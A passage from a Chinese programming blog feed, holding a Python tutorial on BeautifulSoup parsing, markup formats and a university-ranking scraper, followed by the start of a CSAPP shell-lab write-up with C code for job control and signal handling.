class="built_in">print</span>(sibling)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------------------------------------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 捕获异常并打印错误信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error:&quot;</span>, e)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="信息组织与提取"><a href="#信息组织与提取" class="headerlink" title="信息组织与提取"></a>信息组织与提取</h3><h4 id="信息标记的三种方式"><a href="#信息标记的三种方式" class="headerlink" title="信息标记的三种方式"></a>信息标记的三种方式</h4><p><code>XML (eXtensible Markup Language)</code></p><ul><li>最早的通用信息标记语言，可扩展性好，但繁琐</li><li>Internet上的信息交互与传递</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">firstName</span>&gt;</span>Tian<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lastName</span>&gt;</span>Song<span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">streetAddr</span>&gt;</span>中关村南大街5号<span class="tag">&lt;/<span class="name">streetAddr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">city</span>&gt;</span>北京市<span class="tag">&lt;/<span class="name">city</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>100081<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">prof</span>&gt;</span>Computer System<span class="tag">&lt;/<span class="name">prof</span>&gt;</span><span class="tag">&lt;<span class="name">prof</span>&gt;</span>Security<span class="tag">&lt;/<span class="name">prof</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>JSON (JavaScript Object Notation)</code></p><ul><li><p>信息有类型，适合程序处理(js)，较XML简洁</p></li><li><p>移动应用云端和节点的信息通信，无注释</p></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">“firstName” <span class="punctuation">:</span> “Tian” <span class="punctuation">,</span></span><br><span class="line">“lastName” <span class="punctuation">:</span> “Song” <span class="punctuation">,</span></span><br><span class="line">“address” <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">“streetAddr” <span class="punctuation">:</span> “中关村南大街<span class="number">5</span>号” <span class="punctuation">,</span></span><br><span class="line">“city” <span class="punctuation">:</span> “北京市” <span class="punctuation">,</span></span><br><span class="line">“zipcode” <span class="punctuation">:</span> “<span class="number">100081</span>”</span><br><span class="line"><span class="punctuation">&#125;</span> <span class="punctuation">,</span></span><br><span class="line">“prof” <span class="punctuation">:</span> <span class="punctuation">[</span> “Computer System” <span class="punctuation">,</span> “Security” <span class="punctuation">]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>YAML (YAML Ain&#39;t Markup Language)</code></p><ul><li><p>信息无类型，文本信息比例最高，可读性好</p></li><li><p>各类系统的配置文件，有注释易读</p></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">firstName :</span> <span class="string">Tian</span></span><br><span class="line"><span class="attr">lastName :</span> <span class="string">Song</span></span><br><span class="line"><span class="attr">address :</span></span><br><span class="line"><span class="attr">streetAddr :</span> <span class="string">中关村南大街5号</span></span><br><span class="line"><span class="attr">city :</span> <span class="string">北京市</span></span><br><span class="line"><span class="attr">zipcode :</span> <span class="number">100081</span></span><br><span class="line"><span class="attr">prof :</span></span><br><span class="line"><span class="string">‐Computer</span> <span class="string">System</span></span><br><span class="line"><span class="string">‐Security</span></span><br></pre></td></tr></table></figure><h4 id="信息提取"><a href="#信息提取" class="headerlink" title="信息提取"></a>信息提取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://python123.io/ws/demo.html&#x27;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url)  <span class="comment"># 发送GET请求获取页面内容</span></span><br><span class="line">    demo = r.text  <span class="comment"># 获取页面文本</span></span><br><span class="line">    soup = BeautifulSoup(demo, <span class="string">&quot;html.parser&quot;</span>)  <span class="comment"># 使用BeautifulSoup解析页面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找所有&lt;a&gt;标签并打印其href属性值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(link.get(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找所有标签名，并打印出每个标签的名称</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(<span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(tag.name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用正则表达式查找标签名中含有&#x27;b&#x27;的所有标签，并打印出标签名</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(re.<span class="built_in">compile</span>(<span class="string">&#x27;b&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(tag.name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据id属性值查找标签，并打印出符合条件的标签</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(<span class="built_in">id</span>=<span class="string">&#x27;link1&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(tag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(<span class="built_in">id</span>=re.<span class="built_in">compile</span>(<span class="string">&#x27;link&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(tag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找所有&lt;a&gt;标签及其子孙节点，并打印出每个标签</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(soup.find_all(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 只在当前层级查找&lt;a&gt;标签，并打印出每个标签</span></span><br><span class="line">    <span class="built_in">print</span>(soup.find_all(<span class="string">&#x27;a&#x27;</span>, recursive=<span class="literal">False</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据文本内容查找标签，并打印出符合条件的标签</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(soup.find_all(string=<span class="string">&quot;Basic Python&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(soup.find_all(string=re.<span class="built_in">compile</span>(<span class="string">&#x27;Python&#x27;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 捕获异常并打印错误信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error:&quot;</span>, e)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="拓展方法"><a href="#拓展方法" class="headerlink" title="拓展方法"></a>拓展方法</h5><p>方法说明</p><ul><li>&lt;&gt;.find() 搜索且只返回一个结果，同.find_all()参数</li><li>&lt;&gt;.find_parents() 在先辈节点中搜索，返回列表类型，同.find_all()参数</li><li>&lt;&gt;.find_parent() 在先辈节点中返回一个结果，同.find()参数</li><li>&lt;&gt;.find_next_siblings() 在后续平行节点中搜索，返回列表类型，同.find_all()参数</li><li>&lt;&gt;.find_next_sibling() 在后续平行节点中返回一个结果，同.find()参数</li><li>&lt;&gt;.find_previous_siblings() 在前序平行节点中搜索，返回列表类型，同.find_all()参数</li><li>&lt;&gt;.find_previous_sibling() 在前序平行节点中返回一个结果，同.find()参数</li></ul><h3 id="中国大学排名定向爬虫实例"><a href="#中国大学排名定向爬虫实例" class="headerlink" title="中国大学排名定向爬虫实例"></a>中国大学排名定向爬虫实例</h3><p>这里使用的是2023版的排名，8年过去网页结构已发生变化，稍加修改还能继续爬取<a href="https://www.shanghairanking.cn/rankings/bcur/2020">【软科排名】2023年最新软科中国大学排名|中国最好大学排名 (shanghairanking.cn)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getHTMLText</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取指定URL的HTML文本内容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">    url (str): 目标网页的URL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">    str: 网页的HTML内容，如果请求失败则返回空字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fillUnivList</span>(<span class="params">ulist, html</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将HTML文本中的大学信息填充到列表中</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">    ulist (list): 存储大学信息的列表</span></span><br><span class="line"><span class="string">    html (str): 网页的HTML内容</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">&#x27;tbody&#x27;</span>).children:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tr, bs4.element.Tag): <span class="comment">#是否为标签元素</span></span><br><span class="line">            tds = tr(<span class="string">&#x27;td&#x27;</span>)</span><br><span class="line">            a = tds[<span class="number">0</span>].string.strip()</span><br><span class="line">            b = tds[<span class="number">1</span>].find(<span class="string">&#x27;a&#x27;</span>, class_=<span class="string">&#x27;name-cn&#x27;</span>).string.strip()<span class="comment">#大学名</span></span><br><span class="line">            c = tds[<span class="number">1</span>].find(<span class="string">&#x27;p&#x27;</span>).string.strip()<span class="comment">#985还211还是双一流 </span></span><br><span class="line">            d = tds[<span class="number">2</span>].text.strip()<span class="comment">#地域，不能用stirng，返回了none，这里用text</span></span><br><span class="line">            e = tds[<span class="number">3</span>].text.strip()<span class="comment">#类型</span></span><br><span class="line">            f = tds[<span class="number">4</span>].string.strip()<span class="comment">#总分，text和string类型都可以</span></span><br><span class="line">            ulist.append([a, b, c, d, e, f])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printUnivList</span>(<span class="params">ulist, num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    打印大学信息列表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">    ulist (list): 存储大学信息的列表</span></span><br><span class="line"><span class="string">    num (int): 打印的大学数量</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tplt = <span class="string">&quot;&#123;:^20&#125;\t&#123;:^20&#125;\t&#123;:^20&#125;\t&#123;:^20&#125;\t&#123;:^10&#125;\t&#123;:^10&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(tplt.<span class="built_in">format</span>(<span class="string">&quot;排名&quot;</span>, <span class="string">&quot;学校名称&quot;</span>, <span class="string">&quot;级别&quot;</span>, <span class="string">&quot;地域&quot;</span>, <span class="string">&quot;类型&quot;</span>, <span class="string">&quot;总分&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        u = ulist[i]</span><br><span class="line">        <span class="built_in">print</span>(tplt.<span class="built_in">format</span>(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], u[<span class="number">3</span>], u[<span class="number">4</span>], u[<span class="number">5</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    主函数，用于执行爬虫程序</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    uinfo = []</span><br><span class="line">    url = <span class="string">&#x27;https://www.shanghairanking.cn/rankings/bcur/202311&#x27;</span></span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    fillUnivList(uinfo, html)</span><br><span class="line">    printUnivList(uinfo, <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shlab</title>
      <link href="/2024/04/06/csapp/shlab/"/>
      <url>/2024/04/06/csapp/shlab/</url>
      
        <content type="html"><![CDATA[<h2 id="shlab"><a href="#shlab" class="headerlink" title="shlab"></a>shlab</h2><ul><li>这个lab主要是考察<code>信号</code>的使用，还有进程创建的知识。</li></ul><p>首先回顾一下信号处理程序的终点：</p><ol><li>处理程序要尽可能简单。</li><li>在处理程序中只调用<code>异步信号安全的函数</code>。(可重入的且不能被信号处理程序中断)。</li><li>在进入处理程序时把<code>errno</code> 保存在某个局部变最中，在处理程序返回前恢复它。</li><li><code>阻塞所有的信号</code>，保护对共享<code>全局数据</code>结构的访问。</li></ol><p>首先是参数解析执行，在子进程创建过程中，设置和解除阻塞的<code>SIGCHLD</code>信号来避免进程在添加进<code>job组</code>前终止导致把不存在的子进程添加到作业列表中，书上已经给我们例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[MAXARGS] = &#123;<span class="literal">NULL</span>&#125;;       <span class="comment">//初始化指针地址</span></span><br><span class="line">    <span class="type">int</span> fg_bg;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    </span><br><span class="line">    <span class="type">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);<span class="comment">//把每个信号添加到mask_all</span></span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;mask_one);<span class="comment">//初始化mask_one为空集合</span></span><br><span class="line">    <span class="built_in">sigaddset</span>(&amp;mask_one, SIGCHLD);<span class="comment">// 把SIGCHLD添加到mask_one</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fg_bg = <span class="built_in">parseline</span>(cmdline,argv) + <span class="number">1</span>;      <span class="comment">//对齐全局变量，判断是bg还是fg</span></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>] == <span class="literal">NULL</span>)     <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">builtin_cmd</span>(argv))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_one, &amp;prev_one);   <span class="comment">//阻塞SIGCHLD,防止子进程因SIGCHLD被回收</span></span><br><span class="line">        <span class="keyword">if</span>((pid=fork())==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);     <span class="comment">//设置子进程解除阻塞</span></span><br><span class="line">            <span class="built_in">setpgid</span>(<span class="number">0</span>, <span class="number">0</span>);         <span class="comment">//子进程新建进程组并加入进程组 </span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">execve</span>(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s:Command not found!&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">                </span><br><span class="line">                &#125;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);      <span class="comment">//父进程阻塞所有信号</span></span><br><span class="line">        <span class="built_in">addjob</span>(jobs,pid,fg_bg,cmdline);        <span class="comment">//添加进工作组</span></span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);     <span class="comment">//父进程解除所有阻塞</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(fg_bg == FG)     <span class="comment">//前台命令,等待执行返回</span></span><br><span class="line">            &#123;     </span><br><span class="line">                <span class="built_in">waitfg</span>(pid);        </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>        <span class="comment">//后台进程</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> jid = <span class="built_in">pid2jid</span>(pid);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>,jid , pid, cmdline);</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是判断是否为内置命令，如果是，则执行对应命令，返回1，否则返回0。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;quit&quot;</span>))     </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> m_job = !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;jobs&quot;</span>);</span><br><span class="line">    <span class="type">bool</span> m_bg = !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;bg&quot;</span>);</span><br><span class="line">    <span class="type">bool</span> m_fg = !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;fg&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(m_job)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">listjobs</span>(jobs);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(m_bg || m_fg)       <span class="comment">//不能直接else，否则不是内置指令也能执行do_bgfg</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">do_bgfg</span>(argv);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行bg和fg任务，对命令行参数进行解析，执行对应操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> bg_fg = (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;bg&quot;</span>))<span class="number">+1</span>;</span><br><span class="line">     <span class="keyword">struct</span> <span class="title class_">job_t</span>* job = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="type">int</span>   id;</span><br><span class="line">     <span class="keyword">if</span>(argv[<span class="number">1</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 